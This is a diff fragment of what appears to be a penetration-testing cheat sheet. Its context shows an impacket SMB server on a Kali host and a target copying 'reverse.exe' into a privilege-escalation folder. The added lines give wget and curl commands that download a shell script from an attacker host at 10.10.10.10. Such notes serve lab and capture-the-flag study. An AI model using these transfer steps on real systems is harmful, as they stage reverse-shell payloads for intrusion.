@@ -162,3 +162,9 @@ sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py kali .    # O
 
 copy \\10.10.10.10\kali\reverse.exe C:\PrivEsc\reverse.exe    # On target
 ```
+### Linux
+```
+wget http://10.10.10.10:8000/some.sh
+
+curl -o some.sh http://10.10.10.10:8000/some.sh
+```
